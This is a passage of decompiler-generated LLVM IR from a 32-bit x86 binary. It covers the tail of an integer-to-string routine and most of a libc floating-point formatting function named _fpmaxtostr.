  br label %dec_label_pc_80553ea

dec_label_pc_80553ea:                             ; preds = %entry, %dec_label_pc_80553cb, %dec_label_pc_80553d1
  %v0_80553ef = phi i32 [ %v1_80553cb, %dec_label_pc_80553d1 ], [ %v1_80553cb, %dec_label_pc_80553cb ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_80553d1 ], [ 0, %dec_label_pc_80553cb ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_80553ef
  %tmp35 = urem i32 -1, %v0_80553ef
  %v1_80553f1 = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_80553f5 = load i32, i32* %esi.global-to-local, align 4
  %v12_80553f5 = icmp eq i32 %v1_80553f1, %v1_80553f5
  %v1_80553ff = icmp eq i1 %v12_80553f5, false
  br i1 %v1_80553ff, label %dec_label_pc_805540e, label %dec_label_pc_8055401

dec_label_pc_8055401:                             ; preds = %dec_label_pc_80553ea
  %v1_8055401 = add i32 %div, 1
  br label %dec_label_pc_805540e

dec_label_pc_805540e:                             ; preds = %dec_label_pc_80553ea, %dec_label_pc_8055401
  %stack_var_-20.0.off0 = phi i32 [ %v1_80553f1, %dec_label_pc_80553ea ], [ 0, %dec_label_pc_8055401 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_80553ea ], [ %v1_8055401, %dec_label_pc_8055401 ]
  %v0_805540e = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_805540e, i32* %ebp.global-to-local, align 4
  %v0_8055410 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055410, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055416

dec_label_pc_8055416:                             ; preds = %dec_label_pc_8055455, %dec_label_pc_805540e
  %v0_805544d = phi i32 [ %v0_8055466, %dec_label_pc_8055455 ], [ %v0_805540e, %dec_label_pc_805540e ]
  %v0_805541a = phi i32 [ %v1_8055468, %dec_label_pc_8055455 ], [ %v0_8055410, %dec_label_pc_805540e ]
  %v1_8055416 = icmp eq i32 %v0_805541a, 0
  br i1 %v1_8055416, label %dec_label_pc_805544d, label %dec_label_pc_805541a

dec_label_pc_805541a:                             ; preds = %dec_label_pc_8055416
  %v0_805541e = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_805541a, %v0_805541e
  %tmp36 = urem i32 %v0_805541a, %v0_805541e
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_805544d, %v0_805541e
  %tmp37 = urem i32 %v0_805544d, %v0_805541e
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8055431 = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_8055435 = add i32 %tmp37, %v6_8055431
  %v8_805543b = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_8055440 = add i32 %div8, %v8_805543b
  store i32 %v2_8055440, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_8055435, %v0_805541e
  %tmp38 = urem i32 %v2_8055435, %v0_805541e
  %v2_8055448 = add i32 %div9, %v2_8055440
  br label %dec_label_pc_8055455

dec_label_pc_805544d:                             ; preds = %dec_label_pc_8055416
  %v0_8055451 = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_805544d, %v0_8055451
  %tmp39 = urem i32 %v0_805544d, %v0_8055451
  br label %dec_label_pc_8055455

dec_label_pc_8055455:                             ; preds = %dec_label_pc_805541a, %dec_label_pc_805544d
  %v0_805545b = phi i32 [ %tmp38, %dec_label_pc_805541a ], [ %tmp39, %dec_label_pc_805544d ]
  %storemerge = phi i32 [ %v2_8055448, %dec_label_pc_805541a ], [ %div12, %dec_label_pc_805544d ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8055455 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055455 = add i32 %v0_8055455, -1
  store i32 %v1_8055455, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_805545b, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_805545b
  %v8_805545b = trunc i32 %storemerge14.in to i8
  %v3_8055464 = inttoptr i32 %v1_8055455 to i8*
  store i8 %v8_805545b, i8* %v3_8055464, align 1
  %v0_8055466 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055468 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055468 = or i32 %v1_8055468, %v0_8055466
  %v3_8055468 = icmp eq i32 %v2_8055468, 0
  %v1_805546a = icmp eq i1 %v3_8055468, false
  br i1 %v1_805546a, label %dec_label_pc_8055416, label %dec_label_pc_805546c

dec_label_pc_805546c:                             ; preds = %dec_label_pc_8055455
  %v4_805546c = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_805546c, label %dec_label_pc_8055477, label %dec_label_pc_8055473

dec_label_pc_8055473:                             ; preds = %dec_label_pc_805546c
  %v0_8055473 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055473 = add i32 %v0_8055473, -1
  store i32 %v1_8055473, i32* %edi.global-to-local, align 4
  %v1_8055474 = inttoptr i32 %v1_8055473 to i8*
  store i8 45, i8* %v1_8055474, align 1
  br label %dec_label_pc_8055477

dec_label_pc_8055477:                             ; preds = %dec_label_pc_805546c, %dec_label_pc_8055473
  %v0_805547a = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_805547a

; uselistorder directives
  uselistorder i32 %v2_8055435, { 1, 0 }
  uselistorder i32 %v0_805541e, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_805541a, { 1, 0, 2 }
  uselistorder i32 %v0_805544d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80553ef, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055477, { 1, 0 }
  uselistorder label %dec_label_pc_8055455, { 1, 0 }
  uselistorder label %dec_label_pc_805540e, { 1, 0 }
  uselistorder label %dec_label_pc_80553ea, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_4()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055485 = load i32, i32* @edi, align 4
  %v0_8055486 = load i32, i32* @esi, align 4
  %v0_8055487 = load i32, i32* @ebx, align 4
  store i32 %v0_8055487, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_805549c = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_805549c = add i3 %v4_805549c, -1
  store i3 %v5_805549c, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80554a3 = add i32 %tmp112, 4
  %v2_80554a3 = inttoptr i32 %v1_80554a3 to i32*
  %v3_80554a3 = load i32, i32* %v2_80554a3, align 4
  store i32 %v3_80554a3, i32* %eax.global-to-local, align 4
  %v1_80554aa = add i32 %tmp112, 8
  %v2_80554aa = inttoptr i32 %v1_80554aa to i8*
  %v3_80554aa = load i8, i8* %v2_80554aa, align 1
  %v4_80554aa = zext i8 %v3_80554aa to i32
  %v5_80554aa = load i32, i32* @ecx, align 4
  %v6_80554aa = and i32 %v5_80554aa, -256
  %v7_80554aa = or i32 %v6_80554aa, %v4_80554aa
  store i32 %v7_80554aa, i32* %ecx.global-to-local, align 4
  %v1_80554ad = inttoptr i32 %tmp112 to i32*
  %v2_80554ad = load i32, i32* %v1_80554ad, align 4
  store i32 %v2_80554ad, i32* %ebp.global-to-local, align 4
  %v3_80554af = and i32 %v3_80554a3, -256
  %v4_80554af = or i32 %v3_80554af, %v4_80554aa
  %v1_80554b5 = or i32 %v4_80554af, 32
  %v3_80554b5 = trunc i32 %v1_80554b5 to i8
  store i32 %v1_80554b5, i32* %eax.global-to-local, align 4
  %v10_80554c0 = icmp eq i8 %v3_80554b5, 97
  %v1_80554c2 = icmp eq i1 %v10_80554c0, false
  br i1 %v1_80554c2, label %dec_label_pc_80554cb, label %dec_label_pc_80554c4

dec_label_pc_80554c4:                             ; preds = %entry
  %v1_80554c4 = add i32 %v7_80554aa, 6
  %v11_80554c4 = trunc i32 %v1_80554c4 to i8
  store i32 %v1_80554c4, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80554cb

dec_label_pc_80554cb:                             ; preds = %entry, %dec_label_pc_80554c4
  %stack_var_-206.0 = phi i8 [ %v3_80554aa, %entry ], [ %v11_80554c4, %dec_label_pc_80554c4 ]
  %v2_80554cb = icmp slt i32 %v2_80554ad, 0
  %v1_80554cd = icmp eq i1 %v2_80554cb, false
  br i1 %v1_80554cd, label %dec_label_pc_80554d4, label %dec_label_pc_80554cf

dec_label_pc_80554cf:                             ; preds = %dec_label_pc_80554cb
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80554d4

dec_label_pc_80554d4:                             ; preds = %dec_label_pc_80554cb, %dec_label_pc_80554cf
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80554e3 = add i32 %tmp112, 12
  %v2_80554e3 = inttoptr i32 %v1_80554e3 to i32*
  %v3_80554e3 = load i32, i32* %v2_80554e3, align 4
  store i32 %v3_80554e3, i32* %eax.global-to-local, align 4
  %v2_80554e6 = and i32 %v3_80554e3, 2
  %v3_80554e6 = icmp eq i32 %v2_80554e6, 0
  br i1 %v3_80554e6, label %dec_label_pc_80554f4, label %dec_label_pc_8055500

dec_label_pc_80554f4:                             ; preds = %dec_label_pc_80554d4
  %v2_80554f4 = urem i32 %v3_80554e3, 2
  %tmp143 = trunc i32 %v2_80554f4 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_8055500

dec_label_pc_8055500:                             ; preds = %dec_label_pc_80554f4, %dec_label_pc_80554d4
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_80554d4 ], [ %tmp144, %dec_label_pc_80554f4 ]
  %v1_8055514 = udiv i32 %v3_80554e3, 256
  %tmp146 = and i32 %v1_8055514, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_8055666, label %dec_label_pc_8055586

dec_label_pc_8055586:                             ; preds = %dec_label_pc_8055500
  store i3 %v4_805549c, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_805558d = add i32 %tmp112, 16
  %v2_805558d = inttoptr i32 %v1_805558d to i32*
  store i32 32, i32* %v2_805558d, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_80555a4 = add i8 %stack_var_-206.0, -96
  %v6_80555a4 = sub i8 95, %stack_var_-206.0
  %v7_80555a4 = and i8 %v6_80555a4, %stack_var_-206.0
  %v8_80555a4 = icmp slt i8 %v7_80555a4, 0
  %v9_80555a4 = icmp eq i8 %v4_80555a4, 0
  %v10_80555a4 = icmp slt i8 %v4_80555a4, 0
  %v3_80555a9 = icmp eq i1 %v10_80555a4, %v8_80555a4
  %v4_80555a9 = icmp eq i1 %v9_80555a4, false
  %v5_80555a9 = and i1 %v4_80555a9, %v3_80555a9
  br i1 %v5_80555a9, label %dec_label_pc_80555b0, label %dec_label_pc_80555ab

dec_label_pc_80555ab:                             ; preds = %dec_label_pc_8055586
  br label %dec_label_pc_80555b0

dec_label_pc_80555b0:                             ; preds = %dec_label_pc_8055586, %dec_label_pc_80555ab
  %v2_80555b8 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80555b8, i32* @ecx, align 4
  br label %dec_label_pc_805598b

dec_label_pc_8055666:                             ; preds = %dec_label_pc_8055500
  %v1_8055525 = add i3 %v4_805549c, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_805566a = and i32 %v3_80554e3, -65536
  %v2_805566f = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_805566f, i32* %edx.global-to-local, align 4
  %v1_8055676 = udiv i16 %tmp103, 256
  %v2_8055676 = zext i16 %v1_8055676 to i32
  %v3_8055676 = mul nuw nsw i32 %v2_8055676, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_805566a.masked = zext i16 %tmp148 to i32
  %v11_8055676 = or i32 %v4_805566a.masked, %v3_8055676
  %v10_8055676 = or i32 %v11_8055676, %v6_805566a
  %v12_8055676 = or i32 %v10_8055676, 3072
  store i32 %v12_8055676, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8055525, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_805568a

dec_label_pc_805568a:                             ; preds = %dec_label_pc_80556db.dec_label_pc_805568a_crit_edge, %dec_label_pc_8055666
  %v2_80556a7 = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_8055666 ], [ %v2_80556a7.pre, %dec_label_pc_80556db.dec_label_pc_805568a_crit_edge ]
  %v1_805568a = phi i3 [ %v1_8055525, %dec_label_pc_8055666 ], [ %v1_805568a.pre, %dec_label_pc_80556db.dec_label_pc_805568a_crit_edge ]
  %v3_80556b1 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8055666 ], [ %v0_805568a.pre, %dec_label_pc_80556db.dec_label_pc_805568a_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_805566f, %dec_label_pc_8055666 ], [ %v4_80556ac, %dec_label_pc_80556db.dec_label_pc_805568a_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_80556b1 to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_80556a4 = sitofp i32 %tmp149 to x86_fp80
  %v4_80556a7 = fsub x86_fp80 %v2_80556a7, %v5_80556a4
  store i3 %v1_805568a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80556ac = add i32 %stack_var_-212.0, 9
  %v4_80556b1 = fmul x86_fp80 %v3_80556b1, %v4_80556a7
  store x86_fp80 %v4_80556b1, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80556b3

dec_label_pc_80556b3:                             ; preds = %dec_label_pc_80556b3.dec_label_pc_80556b3_crit_edge, %dec_label_pc_805568a
  %v0_80556c5 = phi i32 [ %v0_80556c5.pre, %dec_label_pc_80556b3.dec_label_pc_80556b3_crit_edge ], [ %tmp149, %dec_label_pc_805568a ]
  %v0_80556b3 = phi i32 [ %v0_80556b3.pre, %dec_label_pc_80556b3.dec_label_pc_80556b3_crit_edge ], [ 0, %dec_label_pc_805568a ]
  %v1_80556b3 = add i32 %v0_80556b3, 1
  store i32 %v1_80556b3, i32* %esi.global-to-local, align 4
  %v2_80556b8 = sub i32 %v4_80556ac, %v1_80556b3
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_80556c5, 10
  %tmp136 = urem i32 %v0_80556c5, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_80556b8, i32* %eax.global-to-local, align 4
  %v1_80556d1 = or i32 %tmp136, 48
  %v8_80556d1 = trunc i32 %v1_80556d1 to i8
  store i32 %v1_80556d1, i32* %edx.global-to-local, align 4
  %v3_80556d7 = inttoptr i32 %v2_80556b8 to i8*
  store i8 %v8_80556d1, i8* %v3_80556d7, align 1
  %v7_80556d9 = icmp sgt i32 %v1_80556b3, 8
  br i1 %v7_80556d9, label %dec_label_pc_80556db, label %dec_label_pc_80556b3.dec_label_pc_80556b3_crit_edge

dec_label_pc_80556b3.dec_label_pc_80556b3_crit_edge: ; preds = %dec_label_pc_80556b3
  %v0_80556b3.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_80556c5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80556b3

dec_label_pc_80556db:                             ; preds = %dec_label_pc_80556b3
  %v0_80556db = load i32, i32* @edi, align 4
  %v1_80556db = add i32 %v0_80556db, 1
  store i32 %v1_80556db, i32* @edi, align 4
  %v7_80556df = icmp sgt i32 %v1_80556db, 2
  br i1 %v7_80556df, label %dec_label_pc_80556e1, label %dec_label_pc_80556db.dec_label_pc_805568a_crit_edge

dec_label_pc_80556db.dec_label_pc_805568a_crit_edge: ; preds = %dec_label_pc_80556db
  %v0_805568a.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_805568a.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_80556a7.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805568a

dec_label_pc_80556e1:                             ; preds = %dec_label_pc_80556db
  %v0_80556e1 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80556e1 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_80556e1, x86_fp80* %st0.global-to-local, align 4
  %v2_80556e3 = add i3 %v0_80556e1, 2
  store i3 %v2_80556e3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80556e5 = add i8 %stack_var_-206.0, -96
  %v6_80556e5 = sub i8 95, %stack_var_-206.0
  %v7_80556e5 = and i8 %v6_80556e5, %stack_var_-206.0
  %v8_80556e5 = icmp slt i8 %v7_80556e5, 0
  %v9_80556e5 = icmp eq i8 %v4_80556e5, 0
  %v10_80556e5 = icmp slt i8 %v4_80556e5, 0
  %v3_80556ea = icmp eq i1 %v10_80556e5, %v8_80556e5
  %v4_80556ea = icmp eq i1 %v9_80556e5, false
  %v5_80556ea = and i1 %v4_80556ea, %v3_80556ea
  br i1 %v5_80556ea, label %dec_label_pc_80556f9, label %dec_label_pc_80556ec

dec_label_pc_80556ec:                             ; preds = %dec_label_pc_80556e1
  %v4_80556ec = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_80556f9

dec_label_pc_80556f9:                             ; preds = %dec_label_pc_80556e1, %dec_label_pc_80556ec
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_80556e1 ], [ %v4_80556ec, %dec_label_pc_80556ec ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_80556e1 ], [ 69, %dec_label_pc_80556ec ]
  %v12_80556f9 = icmp eq i8 %stack_var_-206.1, 103
  %v1_80556fe = icmp eq i1 %v12_80556f9, false
  br i1 %v1_80556fe, label %dec_label_pc_8055707, label %dec_label_pc_8055700

dec_label_pc_8055700:                             ; preds = %dec_label_pc_80556f9
  %v0_8055700 = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_8055700, 1
  br i1 %tmp137, label %dec_label_pc_805570e, label %dec_label_pc_8055704

dec_label_pc_8055704:                             ; preds = %dec_label_pc_8055700
  %v1_8055704 = add i32 %v0_8055700, -1
  store i32 %v1_8055704, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805570e

dec_label_pc_8055707:                             ; preds = %dec_label_pc_80556f9
  %v12_8055707 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_8055707, label %dec_label_pc_8055712, label %dec_label_pc_8055707.dec_label_pc_805570e_crit_edge

dec_label_pc_8055707.dec_label_pc_805570e_crit_edge: ; preds = %dec_label_pc_8055707
  %v0_805570e.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805570e

dec_label_pc_805570e:                             ; preds = %dec_label_pc_8055707.dec_label_pc_805570e_crit_edge, %dec_label_pc_8055700, %dec_label_pc_8055704
  %v0_805570e = phi i32 [ %v0_805570e.pre, %dec_label_pc_8055707.dec_label_pc_805570e_crit_edge ], [ %v0_8055700, %dec_label_pc_8055700 ], [ %v1_8055704, %dec_label_pc_8055704 ]
  store i32 %v0_805570e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805573f

dec_label_pc_8055712:                             ; preds = %dec_label_pc_8055707
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_8055716 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055716 = add i32 %v0_8055716, -1
  store i32 %v2_8055716, i32* %ebx.global-to-local, align 4
  %v5_805571d = icmp slt i32 %v2_8055716, -1
  br i1 %v5_805571d, label %dec_label_pc_805571f, label %dec_label_pc_805573f

dec_label_pc_805571f:                             ; preds = %dec_label_pc_8055712
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8055727 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8055727, i32* %eax.global-to-local, align 4
  %v4_805572f = bitcast i32* %stack_var_-72 to i8*
  %v5_805572f = call i32 @__GI_memset(i8* %v4_805572f, i32 48, i32 21)
  store i32 %v5_805572f, i32* %eax.global-to-local, align 4
  %v0_805574f.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805573f

dec_label_pc_805573f:                             ; preds = %dec_label_pc_8055712, %dec_label_pc_805571f, %dec_label_pc_805570e
  %v1_805575f = phi i32 [ %v0_805570e, %dec_label_pc_805570e ], [ %v0_805574f.pr.pre, %dec_label_pc_805571f ], [ %v2_8055716, %dec_label_pc_8055712 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8055752 = icmp sgt i32 %v1_805575f, 20
  br i1 %v7_8055752, label %dec_label_pc_8055754, label %dec_label_pc_805575f

dec_label_pc_8055754:                             ; preds = %dec_label_pc_805573f
  %v2_8055754 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8055754, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055773.preheader

dec_label_pc_805575f:                             ; preds = %dec_label_pc_805573f
  %v0_805575f = load i32, i32* @esp, align 4
  %v2_805575f = add i32 %v1_805575f, 165
  %v3_805575f = add i32 %v2_805575f, %v0_805575f
  store i32 %v3_805575f, i32* %eax.global-to-local, align 4
  %v1_8055766 = add i32 %v3_805575f, 2
  store i32 %v1_8055766, i32* %ecx.global-to-local, align 4
  %v2_8055769 = inttoptr i32 %v1_8055766 to i8*
  %v3_8055769 = load i8, i8* %v2_8055769, align 1
  %v4_8055769 = add i8 %v3_8055769, -53
  %v9_8055769 = sub i8 52, %v3_8055769
  %v10_8055769 = and i8 %v9_8055769, %v3_8055769
  %v11_8055769 = icmp slt i8 %v10_8055769, 0
  %v13_8055769 = icmp slt i8 %v4_8055769, 0
  %v2_805576d = icmp eq i1 %v13_8055769, %v11_8055769
  %v3_805576d = zext i1 %v2_805576d to i32
  br label %dec_label_pc_8055773.preheader

dec_label_pc_8055773.preheader:                   ; preds = %dec_label_pc_805575f, %dec_label_pc_8055754
  %v0_805577363 = phi i32 [ %v1_8055766, %dec_label_pc_805575f ], [ %v2_8055754, %dec_label_pc_8055754 ]
  %storemerge52 = phi i32 [ %v3_805576d, %dec_label_pc_805575f ], [ 0, %dec_label_pc_8055754 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055773

dec_label_pc_8055773:                             ; preds = %dec_label_pc_8055773.backedge, %dec_label_pc_8055773.preheader
  %v3_8055774 = phi i32 [ %v3_8055774.pre, %dec_label_pc_8055773.backedge ], [ %storemerge52, %dec_label_pc_8055773.preheader ]
  %v0_8055773 = phi i32 [ %v0_8055776, %dec_label_pc_8055773.backedge ], [ %v0_805577363, %dec_label_pc_8055773.preheader ]
  %v1_8055773 = add i32 %v0_8055773, -1
  store i32 %v1_8055773, i32* %ecx.global-to-local, align 4
  %v1_8055774 = inttoptr i32 %v1_8055773 to i8*
  %v2_8055774 = load i8, i8* %v1_8055774, align 1
  %v4_8055774 = trunc i32 %v3_8055774 to i8
  %v5_8055774 = add i8 %v2_8055774, %v4_8055774
  store i8 %v5_8055774, i8* %v1_8055774, align 1
  %v0_8055776 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055776 = inttoptr i32 %v0_8055776 to i8*
  %v2_8055776 = load i8, i8* %v1_8055776, align 1
  %v3_8055776 = zext i8 %v2_8055776 to i32
  %v4_8055776 = load i32, i32* %edx.global-to-local, align 4
  %v5_8055776 = and i32 %v4_8055776, -256
  %v6_8055776 = or i32 %v5_8055776, %v3_8055776
  store i32 %v6_8055776, i32* %edx.global-to-local, align 4
  %v7_8055778 = icmp eq i8 %v2_8055776, 48
  br i1 %v7_8055778, label %dec_label_pc_8055773.backedge, label %dec_label_pc_805577d

dec_label_pc_8055773.backedge:                    ; preds = %dec_label_pc_8055773, %dec_label_pc_805577d
  %v3_8055774.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055773

dec_label_pc_805577d:                             ; preds = %dec_label_pc_8055773
  %v2_805577d = add i8 %v2_8055776, -57
  %v7_805577d = sub i8 56, %v2_8055776
  %v8_805577d = and i8 %v7_805577d, %v2_8055776
  %v9_805577d = icmp slt i8 %v8_805577d, 0
  %v10_805577d = icmp eq i8 %v2_805577d, 0
  %v11_805577d = icmp slt i8 %v2_805577d, 0
  %v3_8055780 = icmp eq i1 %v11_805577d, %v9_805577d
  %v4_8055780 = icmp eq i1 %v10_805577d, false
  %v5_8055780 = and i1 %v4_8055780, %v3_8055780
  br i1 %v5_8055780, label %dec_label_pc_8055773.backedge, label %dec_label_pc_8055782

dec_label_pc_8055782:                             ; preds = %dec_label_pc_805577d
  %v2_8055782 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8055782, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_8055776, %v2_8055782
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_805578d, label %dec_label_pc_805579a

dec_label_pc_805578d:                             ; preds = %dec_label_pc_8055782
  store i32 %v2_805566f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80557a3

dec_label_pc_805579a:                             ; preds = %dec_label_pc_8055782
  store i32 %v2_8055782, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_8055782, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80557a3

dec_label_pc_80557a3:                             ; preds = %dec_label_pc_805578d, %dec_label_pc_805579a
  %v0_80557a3 = phi i32 [ %v0_8055776, %dec_label_pc_805578d ], [ %v2_8055782, %dec_label_pc_805579a ]
  %v1_80557a3 = add i32 %v0_80557a3, 1
  store i32 %v1_80557a3, i32* %eax.global-to-local, align 4
  %v2_80557aa = inttoptr i32 %v1_80557a3 to i8*
  store i8 0, i8* %v2_80557aa, align 1
  br i1 %v1_80556fe, label %dec_label_pc_80557d0, label %dec_label_pc_80557b5

dec_label_pc_80557b5:                             ; preds = %dec_label_pc_80557a3
  %v0_80557b5 = load i32, i32* %esi.global-to-local, align 4
  %v5_80557b8 = icmp slt i32 %v0_80557b5, -4
  br i1 %v5_80557b8, label %dec_label_pc_80557dd, label %dec_label_pc_80557ba

dec_label_pc_80557ba:                             ; preds = %dec_label_pc_80557b5
  %v1_80557ba = load i32, i32* %ebx.global-to-local, align 4
  %v7_80557bc = icmp slt i32 %v1_80557ba, %v0_80557b5
  br i1 %v7_80557bc, label %dec_label_pc_80557dd, label %dec_label_pc_80557c5

dec_label_pc_80557c5:                             ; preds = %dec_label_pc_80557ba
  %v2_80557cc = sub i32 %v1_80557ba, %v0_80557b5
  store i32 %v2_80557cc, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80557e1

dec_label_pc_80557d0:                             ; preds = %dec_label_pc_80557a3
  %v4_80557d0 = zext i8 %stack_var_-206.1 to i32
  %v5_80557d0 = load i32, i32* %ecx.global-to-local, align 4
  %v6_80557d0 = and i32 %v5_80557d0, -256
  %v7_80557d0 = or i32 %v6_80557d0, %v4_80557d0
  store i32 %v7_80557d0, i32* %ecx.global-to-local, align 4
  %v10_80557d8 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_80557d8, label %dec_label_pc_80557d0.dec_label_pc_80557e1_crit_edge, label %dec_label_pc_80557dd

dec_label_pc_80557d0.dec_label_pc_80557e1_crit_edge: ; preds = %dec_label_pc_80557d0
  %v0_80557e1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80557e1

dec_label_pc_80557dd:                             ; preds = %dec_label_pc_80557b5, %dec_label_pc_80557ba, %dec_label_pc_80557d0
